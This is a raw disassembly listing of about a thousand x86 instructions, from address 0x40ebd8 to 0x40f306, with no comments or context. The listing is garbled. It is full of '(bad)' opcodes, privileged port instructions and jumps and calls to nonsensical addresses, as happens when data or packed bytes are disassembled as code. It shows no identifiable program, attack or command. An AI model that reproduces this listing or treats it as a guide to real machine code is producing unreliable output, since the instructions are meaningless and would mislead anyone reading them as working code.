  40ebd8:	push   ss
  40ebd9:	shr    al,0xd
  40ebdc:	arpl   si,di
  40ebde:	sahf   
  40ebdf:	or     BYTE PTR [edx-0x6277d1c9],dh
  40ebe5:	inc    BYTE PTR [edi+esi*8]
  40ebe8:	bound  esi,QWORD PTR [ecx+edi*1+0x23]
  40ebec:	mov    cl,0x3a
  40ebee:	jle    0x40ec15
  40ebf0:	ret    
  40ebf1:	pop    ebp
  40ebf2:	push   0x40007f8
  40ebf7:	ret    0x826f
  40ebfa:	ins    DWORD PTR es:[edi],dx
  40ebfb:	dec    esi
  40ebfc:	in     al,dx
  40ebfd:	dec    eax
  40ebff:	test   al,0x61
  40ec01:	je     0x40ec2c
  40ec03:	adc    edx,ebx
  40ec05:	cmp    cl,BYTE PTR [esi+0x35]
  40ec08:	mov    eax,DWORD PTR [ebp+eax*2-0x1e]
  40ec0c:	mov    eax,ds:0x613af048
  40ec11:	je     0x40ec3c
  40ec13:	push   ebx
  40ec14:	rcr    bh,1
  40ec16:	add    BYTE PTR [eax],al
  40ec18:	cs push ebx
  40ec1a:	popa   
  40ec1b:	je     0x40ec42
  40ec1d:	mov    edx,edi
  40ec1f:	pop    es
  40ec20:	or     DWORD PTR [eax],ecx
  40ec22:	pop    ds
  40ec23:	call   DWORD PTR [esi]
  40ec25:	jne    0x40ec6b
  40ec27:	add    esi,DWORD PTR [ecx]
  40ec29:	or     BYTE PTR [edi+0x5e71b2eb],cl
  40ec2f:	push   esi
  40ec30:	mov    DWORD PTR [esp+edi*1+0x3f],esi
  40ec34:	xor    DWORD PTR [ebp-0x6d0dff2c],esp
  40ec3a:	dec    ecx
  40ec3b:	inc    esp
  40ec3c:	in     eax,0x3d
  40ec3e:	add    al,BYTE PTR [eax]
  40ec40:	xor    DWORD PTR [edx],eax
  40ec42:	cmp    DWORD PTR [eax+0x70],ecx
  40ec45:	cmp    eax,0x14397461
  40ec4a:	jbe    0x40ec54
  40ec4c:	sbb    ebx,edi
  40ec4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec4f:	add    edx,DWORD PTR [ebp+0x75]
  40ec52:	sbb    BYTE PTR [ecx+esi*1],al
  40ec55:	adc    al,0x69
  40ec57:	(bad)  [eax]
  40ec59:	adc    al,0xbd
  40ec5b:	or     esp,DWORD PTR [esi+0x4b6bf0c1]
  40ec61:	add    DWORD PTR [esi],esi
  40ec63:	bound  ecx,QWORD PTR [ecx+0x3103e88c]
  40ec69:	cmp    al,0xc4
  40ec6b:	retf   0x4b87
  40ec6e:	sbb    eax,0x63c36d8
  40ec73:	sbb    al,0x76
  40ec75:	dec    ebx
  40ec76:	dec    ecx
  40ec77:	sub    edx,edi
  40ec79:	aam    0xe8
  40ec7b:	out    0x0,eax
  40ec7d:	add    BYTE PTR [edi+0x1],ah
  40ec80:	jmp    0x62551d88
  40ec85:	inc    edi
  40ec86:	ror    BYTE PTR [edx-0x4d],cl
  40ec89:	add    esi,DWORD PTR [ecx]
  40ec8b:	adc    al,0xe9
  40ec8d:	mov    dh,0xf6
  40ec8f:	mov    ebx,0x13fe3d83
  40ec94:	inc    ecx
  40ec95:	ret    0xd45b
  40ec98:	call   0xbde7f50
  40ec9d:	add    al,0x31
  40ec9f:	adc    al,0xe9
  40eca1:	pusha  
  40eca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eca3:	sbb    al,0xb6
  40eca5:	stc    
  40eca6:	mov    cl,0xa
  40eca8:	add    al,ah
  40ecaa:	dec    esi
  40ecab:	adc    al,0x1d
  40ecad:	add    DWORD PTR [edx+0x29d7f84b],esi
  40ecb3:	push   ebx
  40ecb4:	sub    esp,DWORD PTR [eax+0x31]
  40ecb7:	adc    al,0xe9
  40ecb9:	add    ebx,edx
  40ecbb:	and    al,0x86
  40ecbd:	pop    ss
  40ecbe:	pandn  mm4,QWORD PTR [edi]
  40ecc1:	add    al,0xde
  40ecc3:	add    BYTE PTR [eax],al
  40ecc5:	ret    
  40ecc6:	in     eax,0xd3
  40ecc8:	inc    DWORD PTR [eax+0x66ff018c]
  40ecce:	lods   al,BYTE PTR ds:[esi]
  40eccf:	push   esi
  40ecd0:	pop    ss
  40ecd1:	push   edx
  40ecd2:	call   0xa48677b6
  40ecd7:	fisttp WORD PTR [ebx]
  40ecd9:	bound  esi,QWORD PTR [esi+0x1a]
  40ecdc:	(bad)  
  40ecdd:	mov    ebx,0x817f9b3a
  40ece2:	add    BYTE PTR [eax],al
  40ece4:	xor    eax,0x7f360014
  40ece9:	push   ds
  40ecea:	(bad)  
  40ecee:	(bad)  
  40ecef:	jmp    0x6e50b205
  40ecf4:	mov    ch,0x86
  40ecf6:	(bad)  
  40ecf7:	call   0xc37d842e
  40ecfc:	jge    0x40ecd1
  40ecfe:	(bad)  
  40ecff:	call   0xb5401082
  40ed04:	or     bh,bl
  40ed06:	inc    eax
  40ed07:	jmp    0xa26aecdd
  40ed0c:	jae    0x40ed58
  40ed0e:	out    0x1,al
  40ed10:	sub    BYTE PTR [ebx-0x2],cl
  40ed13:	mov    eax,ds:0xe9001432
  40ed18:	ja     0x40ed6e
  40ed1a:	and    ebp,ecx
  40ed1c:	push   ss
  40ed1d:	fwait
  40ed1e:	add    al,0xe9
  40ed20:	xor    dl,BYTE PTR [eax+eax*1]
  40ed23:	push   0x69
  40ed25:	adc    eax,0x1932f683
  40ed2a:	test   esi,ebp
  40ed2c:	xchg   ecx,eax
  40ed2d:	dec    edx
  40ed2e:	(bad)  
  40ed2f:	jb     0x40ed20
  40ed31:	dec    ebp
  40ed32:	pop    esi
  40ed33:	mov    al,0x74
  40ed35:	adc    eax,0x5f053f00
  40ed3a:	fisubr DWORD PTR [ecx]
  40ed3c:	xor    eax,0xd900714c
  40ed41:	sar    ch,1
  40ed43:	mov    esp,DWORD PTR [ecx+0x8bf5f8]
  40ed49:	add    BYTE PTR [ecx-0x155781c3],dl
  40ed4f:	push   ss
  40ed50:	mov    ecx,ecx
  40ed52:	out    dx,al
  40ed53:	cwde   
  40ed54:	(bad)  
  40ed55:	jmp    0x40ed87
  40ed57:	xchg   edi,eax
  40ed58:	mov    DWORD PTR [ebx],0x50c79806
  40ed5e:	adc    ebx,esi
  40ed60:	out    0xa7,al
  40ed62:	sahf   
  40ed63:	adc    eax,0x8d618b00
  40ed68:	mov    ecx,ecx
  40ed6a:	mov    ecx,edi
  40ed6c:	mov    ecx,ecx
  40ed6e:	scas   al,BYTE PTR es:[edi]
  40ed6f:	sbb    dh,dh
  40ed71:	jne    0x40eda7
  40ed73:	push   ebx
  40ed74:	rcl    DWORD PTR [ebp+0x3],0xb9
  40ed78:	data16 or BYTE PTR [edx*2+0x16caf7fe],bh
  40ed80:	ret    
  40ed81:	jmp    ebx
  40ed83:	push   ecx
  40ed84:	push   es
  40ed85:	or     ecx,DWORD PTR [eax]
  40ed87:	popa   
  40ed88:	or     ch,bl
  40ed8a:	inc    ebp
  40ed8b:	mov    bl,0x6
  40ed8d:	(bad)  
  40ed8e:	push   eax
  40ed8f:	push   ebp
  40ed90:	jle    0x40edca
  40ed92:	pop    eax
  40ed93:	ins    BYTE PTR es:[edi],dx
  40ed94:	hlt    
  40ed95:	leave  
  40ed96:	mov    bl,BYTE PTR [eax+eax*1]
  40ed99:	push   ebp
  40ed9a:	rol    ebx,cl
  40ed9c:	add    esp,0x30668504
  40eda2:	int3   
  40eda3:	dec    edi
  40eda4:	(bad)  
  40eda5:	neg    DWORD PTR [edx+0xf]
  40eda8:	ret    
  40eda9:	inc    edi
  40edab:	pop    edx
  40edac:	repnz add BYTE PTR [eax],al
  40edaf:	add    BYTE PTR [eax],bl
  40edb1:	adc    eax,0xa2f32b00
  40edb6:	inc    ebx
  40edb7:	cld    
  40edb8:	cmp    cl,ch
  40edba:	jae    0x40edc4
  40edbc:	xor    DWORD PTR [ebx+0x3b310d78],edx
  40edc2:	xchg   DWORD PTR [edi+0x745d8869],edi
  40edc8:	sub    DWORD PTR [ebx-0x3e29cbd8],esp
  40edce:	mov    WORD PTR [ecx+ecx*8-0x6],es
  40edd2:	mov    bl,0xe7
  40edd4:	push   ebp
  40edd5:	out    dx,eax
  40edd6:	pop    esi
  40edd7:	(bad)  
  40edd8:	test   al,0x6f
  40edda:	push   esi
  40eddb:	(bad)  
  40eddc:	cmp    al,0xdf
  40edde:	imul   edx,DWORD PTR [ebx+0x3c],0x3b
  40ede2:	add    cl,BYTE PTR [ebx]
  40ede4:	jno    0x40ed6c
  40ede6:	idiv   dh
  40ede8:	and    al,0xd3
  40edea:	pop    esi
  40edeb:	je     0x40ed8a
  40eded:	stos   BYTE PTR es:[edi],al
  40edee:	push   0xffffff87
  40edf0:	dec    ebp
  40edf1:	cli    
  40edf2:	pop    esi
  40edf3:	(bad)  
  40edf4:	cld    
  40edf5:	out    dx,al
  40edf6:	imul   eax,DWORD PTR [ecx+0x2c],0x3b
  40edfa:	add    bh,bh
  40edfc:	cld    
  40edfd:	xor    ch,BYTE PTR [edx-0xd]
  40ee00:	and    al,0x1a
  40ee02:	pop    edi
  40ee03:	and    ah,0x46
  40ee06:	add    dh,BYTE PTR [edi+edi*1-0x5d]
  40ee0a:	ror    BYTE PTR [edx-0x10],0x3a
  40ee0e:	pop    ebp
  40ee0f:	je     0x40ee56
  40ee11:	adc    dl,BYTE PTR [ebx+0x3100000d]
  40ee17:	cmp    ecx,DWORD PTR [ecx]
  40ee19:	rol    ch,0x2f
  40ee1c:	cdq    
  40ee1d:	add    BYTE PTR [ecx],dh
  40ee1f:	cmp    eax,DWORD PTR [edx]
  40ee21:	jmp    DWORD PTR [ecx+eiz*2+0x4e65056a]
  40ee28:	pop    ebp
  40ee29:	mov    dh,dl
  40ee2b:	repnz dec esp
  40ee2d:	shr    DWORD PTR ds:0x1d8ab73d,0xd6
  40ee34:	popf   
  40ee35:	(bad)  [ecx+0x14]
  40ee38:	jmp    0xaa566e98
  40ee3d:	pop    esi
  40ee3e:	test   ecx,0xfe1d6be0
  40ee44:	lea    ebx,[esi+0x58]
  40ee47:	sbb    al,0x11
  40ee49:	enter  0xd516,0xe8
  40ee4d:	pop    esi
  40ee4e:	pop    ebp
  40ee4f:	sbb    al,0x81
  40ee51:	fadd   QWORD PTR [esi]
  40ee53:	inc    edi
  40ee54:	ins    DWORD PTR es:[edi],dx
  40ee55:	jmp    0x2c0caa88
  40ee5a:	jo     0x40ee70
  40ee5c:	pop    esi
  40ee5d:	fsubr  DWORD PTR [esi]
  40ee5f:	cmp    al,0xc2
  40ee61:	sbb    ebp,DWORD PTR [esi+0x2ed84d47]
  40ee67:	cmp    al,0x34
  40ee69:	pusha  
  40ee6a:	lahf   
  40ee6b:	inc    edi
  40ee6c:	add    BYTE PTR [ecx+esi*1],0x14
  40ee70:	jmp    0xe9515ec1
  40ee75:	mov    eax,0x476938bb
  40ee7a:	add    BYTE PTR [eax],al
  40ee7c:	xchg   BYTE PTR [ebx+eiz*8+0x11143640],bh
  40ee83:	shl    DWORD PTR [ecx],1
  40ee85:	push   ebx
  40ee86:	or     eax,0x617dd5e
  40ee8b:	fdiv   DWORD PTR [esi]
  40ee8d:	cmp    al,0x78
  40ee8f:	sbb    DWORD PTR [esi+0x47],edx
  40ee92:	sub    eax,0xe9154ac8
  40ee97:	add    esi,DWORD PTR [ecx]
  40ee99:	cdq    
  40ee9a:	sub    ebx,DWORD PTR [esi+ebp*8-0x45]
  40ee9e:	push   ss
  40ee9f:	leave  
  40eea0:	icebp  
  40eea1:	adc    eax,ecx
  40eea3:	dec    edx
  40eea4:	jbe    0x40eeed
  40eea6:	int    0x9
  40eea8:	icebp  
  40eea9:	mov    edi,0xc8b3b40a
  40eeae:	shl    ah,0x9d
  40eeb1:	push   ds
  40eeb2:	add    BYTE PTR [ebx+0x5],al
  40eeb5:	xlat   BYTE PTR ds:[ebx]
  40eeb6:	(bad)  
  40eeb7:	xor    al,0x21
  40eeb9:	cmp    al,0xdb
  40eebb:	loop   0x40ef1a
  40eebd:	inc    esi
  40eebe:	or     ch,BYTE PTR [ecx+0x2cc70dd9]
  40eec4:	push   ecx
  40eec5:	inc    edi
  40eec6:	(bad)  
  40eec7:	jmp    0xc2a52afe
  40eecc:	jge    0x40ef14
  40eece:	mov    ah,BYTE PTR [ecx+edx*2]
  40eed1:	pop    esp
  40eed2:	shl    ecx,0x32
  40eed5:	loope  0x40ee61
  40eed7:	jge    0x40ee59
  40eed9:	scas   al,BYTE PTR es:[edi]
  40eeda:	pop    edi
  40eedb:	inc    esp
  40eedc:	cmc    
  40eedd:	inc    esi
  40eede:	neg    bl
  40eee0:	add    BYTE PTR [eax],al
  40eee2:	xor    edx,DWORD PTR [ebx-0x2]
  40eee5:	add    ch,BYTE PTR [eax+0x46]
  40eee8:	je     0x40eecb
  40eeea:	sbb    cl,dh
  40eeec:	inc    BYTE PTR [esi-0x4]
  40eeef:	sbb    eax,eax
  40eef1:	out    dx,al
  40eef2:	scas   al,BYTE PTR es:[edi]
  40eef3:	mov    al,ds:0x4732e8ff
  40eef8:	je     0x40eedb
  40eefa:	sbb    cl,BYTE PTR [ebx+0x31]
  40eefd:	fcomp  QWORD PTR es:[ecx]
  40ef00:	rcl    BYTE PTR [edi+ebp*1+0x32e9893d],0x14
  40ef08:	call   DWORD PTR [esi+esi*1-0x350e8bb9]
  40ef0f:	lods   eax,DWORD PTR ds:[esi]
  40ef10:	(bad)  
  40ef11:	(bad)  
  40ef12:	cmc    
  40ef13:	inc    ebp
  40ef14:	je     0x40eef7
  40ef16:	(bad)  
  40ef18:	cmp    esi,ebp
  40ef1a:	in     eax,0x19
  40ef1c:	rcr    BYTE PTR [ebx+esi*1+0x3b],0x70
  40ef21:	ficomp WORD PTR [edi+0xe]
  40ef24:	call   0xfe8639c9
  40ef29:	loop   0x40ef9d
  40ef2b:	rol    BYTE PTR [ecx],0x0
  40ef2e:	add    esi,DWORD PTR ds:0xba2075fd
  40ef34:	pop    ds
  40ef35:	cmp    edi,eax
  40ef37:	call   0x127eaf45
  40ef3c:	jmp    0x40ef93
  40ef3e:	and    BYTE PTR [esi+0x25],bh
  40ef41:	inc    ecx
  40ef42:	or     cl,ch
  40ef44:	jae    0x40ef4e
  40ef46:	add    BYTE PTR [eax],al
  40ef48:	mov    al,0x8b
  40ef4a:	cmp    bh,bh
  40ef4c:	mov    bh,0x1c
  40ef4e:	shl    BYTE PTR [ebp-0x36],0xbc
  40ef52:	inc    eax
  40ef53:	(bad)  
  40ef54:	fstp   QWORD PTR [ecx]
  40ef56:	call   0xfe296ff5
  40ef5b:	or     ebx,DWORD PTR [eax+0x1ceb005e]
  40ef61:	out    0x73,eax
  40ef63:	or     BYTE PTR [eax-0x1d],ah
  40ef66:	inc    DWORD PTR ss:[edi]
  40ef69:	sbb    al,0xc0
  40ef6b:	jne    0x40ef07
  40ef6d:	mov    esp,0x19ddff24
  40ef72:	call   0xfe2989fe
  40ef77:	add    DWORD PTR [eax-0xf],0x76
  40ef7b:	add    dh,BYTE PTR [ebx]
  40ef7d:	ror    BYTE PTR [ecx],1
  40ef7f:	rcr    BYTE PTR [esp+eax*2+0x4188003b],0xfe
  40ef87:	jb     0x40efdd
  40ef89:	lods   al,BYTE PTR ds:[esi]
  40ef8a:	(bad)  
  40ef8b:	call   FWORD PTR [eax+0x11]
  40ef8e:	jmp    0x40ef95
  40ef90:	repz adc eax,DWORD PTR [eax]
  40ef93:	add    BYTE PTR [eax-0x64],cl
  40ef96:	rcr    DWORD PTR [ebx+0x11],0xd3
  40ef9a:	push   es
  40ef9b:	add    BYTE PTR [ebp+0x2968ea9c],bl
  40efa1:	or     bh,BYTE PTR [edi]
  40efa3:	add    BYTE PTR [eax+0x5e],dl
  40efa6:	inc    edx
  40efa8:	xor    DWORD PTR [esi+0x5a],ebx
  40efab:	je     0x40efad
  40efad:	add    BYTE PTR ds:0x907d056,dh
  40efb3:	adc    eax,0x4216fe5b
  40efb8:	inc    edx
  40efb9:	je     0x40efe6
  40efbb:	jle    0x40ef8d
  40efbd:	or     eax,DWORD PTR [esi]
  40efbf:	add    BYTE PTR [eax+ebp*8],cl
  40efc2:	outs   dx,BYTE PTR es:[esi]
  40efc4:	pop    edx
  40efc5:	(bad)  
  40efc6:	sub    bh,BYTE PTR [ebx-0x30]
  40efc9:	or     ch,dh
  40efcb:	daa    
  40efcc:	or     bh,bh
  40efce:	pop    esp
  40efcf:	xor    ebp,DWORD PTR [edx+0x7]
  40efd2:	fimul  WORD PTR [ebp+0x42f3c85a]
  40efd8:	add    dl,BYTE PTR [ebp-0x46]
  40efdb:	mov    es,WORD PTR [esi-0x4cd6323d]
  40efe1:	addr16 push ecx
  40efe3:	int    0xc3
  40efe5:	(bad)  
  40efe6:	mov    esi,0xaec30368
  40efeb:	adc    DWORD PTR [edi],edi
  40efed:	out    0x73,eax
  40efef:	sbb    DWORD PTR [ecx-0x2],0xff667776
  40eff6:	xchg   esi,eax
  40eff7:	cmp    al,BYTE PTR [edx]
  40eff9:	(bad)  
  40effa:	hlt    
  40effb:	into   
  40effc:	mov    bl,0xe7
  40effe:	mov    eax,0xb2fe594b
  40f003:	outs   dx,DWORD PTR ds:[esi]
  40f004:	data16 (bad) 
  40f006:	std    
  40f007:	adc    cl,BYTE PTR [ecx+0x6a8a5d44]
  40f00d:	jns    0x40f02f
  40f00f:	push   ss
  40f010:	pop    ebx
  40f011:	add    BYTE PTR [eax],0x0
  40f014:	fcomp  QWORD PTR [esi]
  40f016:	add    al,0x75
  40f018:	sub    BYTE PTR [eax+0x12e1ebc0],bh
  40f01e:	out    dx,eax
  40f01f:	xor    BYTE PTR [esi+0x35],al
  40f022:	test   DWORD PTR [ebp+ecx*2+0x13],edi
  40f026:	jmp    0xe8d69d35
  40f02b:	add    esi,DWORD PTR [ecx]
  40f02d:	xchg   ecx,eax
  40f02e:	sub    edx,DWORD PTR [esi+esi*2+0x43]
  40f032:	push   ebx
  40f033:	push   0x5ac5ae16
  40f038:	pop    ss
  40f039:	cwde   
  40f03a:	rol    BYTE PTR [esp+eax*4],0xc1
  40f03e:	jne    0x40f025
  40f040:	dec    edi
  40f041:	aad    0xe8
  40f043:	outs   dx,BYTE PTR ds:[esi]
  40f044:	pop    ecx
  40f045:	pop    ebx
  40f046:	sub    esp,DWORD PTR [eax+0x28]
  40f049:	adc    al,0xe9
  40f04b:	add    esi,esi
  40f04d:	fld    DWORD PTR [eax-0x16ebcefd]
  40f053:	mov    BYTE PTR [ebp+0x2c],dh
  40f056:	sbb    BYTE PTR [ebx+0x5d],bl
  40f059:	xor    BYTE PTR ds:0x75dec36c,dl
  40f05f:	pop    edx
  40f060:	cmp    edx,DWORD PTR [esp+esi*8-0xd]
  40f064:	mov    bl,0xc1
  40f066:	push   eax
  40f067:	add    edi,DWORD PTR ds:0x96d05e0e
  40f06d:	sub    al,0x11
  40f06f:	pop    ecx
  40f070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f071:	inc    ebx
  40f072:	popa   
  40f073:	cmp    ebx,DWORD PTR [edi+0x6b50c9]
  40f079:	add    BYTE PTR [edi+0x5],al
  40f07c:	ds pop edx
  40f07e:	cmp    ebx,DWORD PTR [edi-0x45]
  40f081:	lock mov bl,0xc1
  40f084:	inc    esp
  40f085:	add    eax,DWORD PTR ds:0x92c82613
  40f08b:	lods   al,BYTE PTR ds:[esi]
  40f08c:	jo     0x40f084
  40f08e:	outs   dx,BYTE PTR ds:[esi]
  40f08f:	inc    ebx
  40f090:	add    BYTE PTR [esi+0x3b],dh
  40f093:	adc    al,0xe9
  40f095:	outs   dx,BYTE PTR ds:[esi]
  40f096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f097:	das    
  40f098:	out    0xc2,eax
  40f09a:	(bad)  
  40f09b:	add    ch,cl
  40f09d:	ror    BYTE PTR [eax-0x25],1
  40f0a0:	jmp    FWORD PTR [eax+0x2b]
  40f0a3:	adc    al,0x74
  40f0a5:	in     eax,0x2f
  40f0a7:	pop    edi
  40f0a8:	jae    0x40f031
  40f0aa:	and    al,0x5f
  40f0ac:	jae    0x40f0a7
  40f0ae:	sbb    al,0x13
  40f0b0:	lea    ebp,[edi*2-0x13e8982d]
  40f0b7:	sar    edi,cl
  40f0b9:	rol    ch,1
  40f0bb:	xlat   BYTE PTR ds:[ebx]
  40f0bc:	(bad)  
  40f0bd:	mov    esi,0xc1ebc868
  40f0c2:	xchg   ebp,eax
  40f0c3:	repz (bad) 
  40f0c5:	scas   al,BYTE PTR es:[edi]
  40f0c6:	lods   al,BYTE PTR ds:[esi]
  40f0c7:	push   ebp
  40f0c8:	pop    esi
  40f0c9:	inc    edx
  40f0ca:	push   0x56
  40f0cc:	push   esp
  40f0cd:	jb     0x40f128
  40f0cf:	xchg   esp,eax
  40f0d0:	ret    
  40f0d1:	dec    ecx
  40f0d2:	mov    eax,DWORD PTR [edx-0x2]
  40f0d5:	mov    ss:0xeda64fba,eax
  40f0db:	inc    edx
  40f0dc:	idiv   bl
  40f0de:	add    BYTE PTR [eax],al
  40f0e0:	xor    edx,DWORD PTR [edi-0x2]
  40f0e3:	ss lahf 
  40f0e5:	stc    
  40f0e6:	inc    eax
  40f0e7:	jmp    0xf640f29e
  40f0ec:	ss dec esi
  40f0ee:	add    cl,ch
  40f0f0:	xor    dl,BYTE PTR [ecx+0x420b5d84]
  40f0f6:	(bad)  
  40f0f7:	mov    ecx,0xa12f3ae1
  40f0fc:	stc    
  40f0fd:	inc    ecx
  40f0fe:	or     ch,BYTE PTR [ecx]
  40f100:	cmp    BYTE PTR [eax+0x1432e8a3],bl
  40f106:	sub    DWORD PTR [ecx+eiz*8+0x40],0xfffffffe
  40f10b:	es sub eax,0x32768413
  40f111:	adc    al,0x0
  40f113:	fs out 0x7a,al
  40f116:	std    
  40f117:	push   cs
  40f118:	clc    
  40f119:	sar    dh,cl
  40f11b:	add    BYTE PTR ds:0x4ffffce4,dl
  40f121:	scas   al,BYTE PTR es:[edi]
  40f122:	in     al,dx
  40f123:	aaa    
  40f124:	aas    
  40f125:	fld    TBYTE PTR [ecx]
  40f127:	not    cl
  40f129:	xchg   edx,eax
  40f12a:	mov    ds:0xe9db4ffe,al
  40f12f:	aaa    
  40f130:	inc    esi
  40f131:	or     esi,DWORD PTR [esi-0x38fd17c]
  40f137:	(bad)  
  40f138:	out    dx,eax
  40f139:	test   DWORD PTR [esi+0x5a],esp
  40f13c:	arpl   WORD PTR [ebp-0x2],dx
  40f13f:	mov    WORD PTR [ebp+0xfffcd7],ss
  40f145:	add    BYTE PTR [edi+0x1341e685],bh
  40f14b:	push   ss
  40f14c:	add    BYTE PTR [ebx-0x7a72e63c],al
  40f152:	call   0xb3db:0x28fffddb
  40f159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f15a:	scas   al,BYTE PTR es:[edi]
  40f15b:	fdiv   st(5),st
  40f15d:	call   0x401b19
  40f162:	inc    ecx
  40f163:	ret    0xfea2
  40f166:	aas    
  40f167:	fadd   QWORD PTR [ebx+eax*4+0x4e]
  40f16b:	inc    ebp
  40f16c:	jo     0x40f132
  40f16e:	dec    edi
  40f16f:	xchg   edx,eax
  40f170:	repnz dec BYTE PTR [edi]
  40f173:	fsubr  st(6),st
  40f175:	mov    ah,0x4a
  40f177:	(bad)  
  40f179:	(bad)  
  40f17a:	adc    eax,0xeffffc9d
  40f17f:	adc    al,0x0
  40f181:	add    BYTE PTR [eax+0x158d002f],bl
  40f187:	popf   
  40f188:	cld    
  40f189:	dec    DWORD PTR [edi-0x7b]
  40f18c:	std    
  40f18d:	mov    ch,0x14
  40f18f:	(bad)  
  40f191:	inc    DWORD PTR [eax+0x3b]
  40f194:	das    
  40f195:	push   DWORD PTR [ecx]
  40f197:	sub    cl,BYTE PTR [eax+eax*8]
  40f19a:	cs mov bh,0x5a
  40f19d:	call   DWORD PTR [esi+0x2b]
  40f1a0:	cmp    DWORD PTR [ecx+ecx*4-0xb01a9bf],0x2a4
  40f1ab:	add    BYTE PTR [esi],ch
  40f1ad:	mov    eax,0x2b36ff6a
  40f1b2:	xchg   DWORD PTR [edx+ebp*1-0x7e01a99f],eax
  40f1b9:	sar    edi,cl
  40f1bb:	add    BYTE PTR [ecx],dh
  40f1bd:	sub    ebp,DWORD PTR [edx-0x1d]
  40f1c0:	sub    BYTE PTR [ebx],ch
  40f1c2:	add    cl,BYTE PTR [ebx]
  40f1c4:	icebp  
  40f1c5:	xor    DWORD PTR [esi-0x32],edi
  40f1c8:	xor    DWORD PTR [ebx],ebp
  40f1ca:	add    bh,BYTE PTR ds:0x22c35
  40f1d0:	es mov dl,0x3f
  40f1d3:	(bad)  
  40f1d4:	out    dx,al
  40f1d5:	sub    ch,BYTE PTR [edx+0x4f]
  40f1d8:	cmp    ebp,DWORD PTR [ebx]
  40f1da:	add    dl,BYTE PTR [eax+0x49]
  40f1dd:	dec    dl
  40f1df:	inc    eax
  40f1e0:	xor    eax,ecx
  40f1e2:	add    cl,0xcf
  40f1e5:	rcl    DWORD PTR [esi+0x4f],0xd9
  40f1e9:	into   
  40f1ea:	or     DWORD PTR [eax],eax
  40f1ec:	xor    DWORD PTR [esi+0x2b4b0b3f],ebp
  40f1f2:	xchg   DWORD PTR [edx+ebp*4+0x1fe56e0],eax
  40f1f9:	shl    DWORD PTR [esi-0x78d4cef8],cl
  40f1ff:	test   BYTE PTR [edx-0x1e01a928],bl
  40f205:	loop   0x40f21a
  40f207:	inc    ebx
  40f208:	xchg   BYTE PTR [ecx],cl
  40f20a:	or     eax,eax
  40f20c:	add    al,0xb
  40f20e:	in     al,dx
  40f20f:	int3   
  40f210:	add    BYTE PTR [eax],al
  40f212:	dec    ecx
  40f213:	adc    al,0xa8
  40f215:	add    edi,DWORD PTR [esi+edx*4+0x40675621]
  40f21c:	mov    eax,0xdfc696b
  40f221:	push   edi
  40f222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f224:	sub    dl,BYTE PTR [esi+0x4f]
  40f227:	inc    eax
  40f228:	call   0x3f56:0xb5234eb3
  40f22f:	sub    al,0xd9
  40f231:	mov    BYTE PTR [ebp+0x2f56e655],ch
  40f237:	in     eax,0x6b
  40f239:	sub    BYTE PTR [ebx],0x3f
  40f23c:	aad    0x56
  40f23e:	outs   dx,BYTE PTR ds:[esi]
  40f23f:	sub    al,0x85
  40f241:	sbb    dl,BYTE PTR [esi]
  40f243:	inc    eax
  40f244:	outs   dx,DWORD PTR ds:[esi]
  40f245:	or     dl,0x3e
  40f248:	mov    ebp,0x748a0756
  40f24d:	push   ebp
  40f24e:	(bad)  
  40f24f:	aas    
  40f250:	lods   eax,DWORD PTR ds:[esi]
  40f251:	nop
  40f252:	add    bh,BYTE PTR [edi]
  40f254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f255:	push   esi
  40f256:	(bad)  
  40f257:	enter  0x56d9,0xe7
  40f25b:	or     ebp,DWORD PTR [ecx+0x2dac23cf]
  40f261:	retf   
  40f262:	jno    0x40f278
  40f264:	xchg   ecx,eax
  40f265:	pop    esi
  40f266:	ss adc al,0xe9
  40f269:	mov    bl,0x4e
  40f26b:	fbld   TBYTE PTR [ecx]
  40f26d:	lds    edi,FWORD PTR [esi-0x4b60ccc2]
  40f273:	aas    
  40f274:	imul   eax,DWORD PTR gs:[eax],0x0
  40f278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f279:	rcr    DWORD PTR [ebp+0x56],cl
  40f27c:	sbb    BYTE PTR ds:0x140b03c3,dl
  40f282:	dec    esi
  40f283:	nop
  40f284:	fidivr DWORD PTR [esi]
  40f286:	inc    ebp
  40f287:	push   esi
  40f288:	push   ss
  40f289:	out    0xf,eax
  40f28b:	lds    eax,FWORD PTR [esi+0xae8ffad]
  40f291:	ror    DWORD PTR [ecx],cl
  40f293:	jmp    0x65f531ca
  40f298:	add    al,0x3e
  40f29a:	(bad)  
  40f29b:	adc    DWORD PTR [edi+0x716ff06],ecx
  40f2a1:	mov    BYTE PTR [ebx-0x18c200f1],ah
  40f2a7:	dec    ebp
  40f2a8:	aas    
  40f2a9:	aas    
  40f2aa:	(bad)  
  40f2ab:	(bad)  
  40f2ac:	mov    dh,0x43
  40f2ae:	std    
  40f2af:	mul    ah
  40f2b1:	ss add eax,0xfb3ddfbe
  40f2b7:	sbb    dh,BYTE PTR [ebp+0x7c]
  40f2ba:	(bad)  
  40f2bb:	fidivr WORD PTR [esi+edi*1-0xf]
  40f2bf:	xchg   DWORD PTR ds:0x26640f17,edi
  40f2c5:	ds inc dh
  40f2c8:	(bad)  
  40f2c9:	(bad)  
  40f2cb:	stos   BYTE PTR es:[edi],al
  40f2cc:	(bad)  
  40f2cd:	mov    ebx,ebp
  40f2cf:	push   0x71
  40f2d1:	das    
  40f2d2:	addr16 in al,dx
  40f2d4:	xchg   ebx,eax
  40f2d5:	(bad)  
  40f2d6:	jmp    DWORD PTR [eax-0x613cebfd]
  40f2dc:	add    BYTE PTR [eax],al
  40f2de:	mov    eax,0x33ec6764
  40f2e3:	adc    al,0x0
  40f2e5:	cmp    edi,0xb886ff05
  40f2eb:	mov    BYTE PTR fs:[ecx+ebp*2],ah
  40f2ef:	mov    dl,cl
  40f2f1:	add    DWORD PTR [esi+0x4ae90013],edi
  40f2f7:	mov    al,0x36
  40f2f9:	data16 add al,0x8a
  40f2fc:	shl    DWORD PTR [eax-0x1a],1
  40f2ff:	cs addr16 in al,dx
  40f302:	xor    edx,DWORD PTR [eax+eax*1]
  40f305:	inc    ecx
  40f306:	fild   WORD PTR ds:0x8cf700ff
